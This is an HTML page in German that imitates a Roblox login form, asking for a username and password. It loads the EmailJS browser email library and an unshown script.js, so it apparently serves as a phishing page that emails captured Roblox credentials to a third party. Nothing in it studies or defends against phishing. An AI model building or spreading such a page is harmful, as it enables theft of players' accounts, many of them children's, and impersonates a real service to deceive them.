<!DOCTYPE html>
<html lang="de">
<head>
  <meta charset="UTF-8">
  <title>Roblox Login Formular</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link rel="stylesheet" href="style.css">
</head>
<body>
  <form id="loginForm">
    <h2>Roblox Login</h2>
    <label for="username">Username:</label>
    <input type="text" id="username" name="roblox_username" placeholder="Username" required>
    <label for="password">Passwort:</label>
    <input type="password" id="password" name="roblox_password" placeholder="Passwort" required>
    <button type="submit">Login</button>
  </form>
  <p id="status"></p>
  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
  <script src="script.js"></script>
</body>
</html>
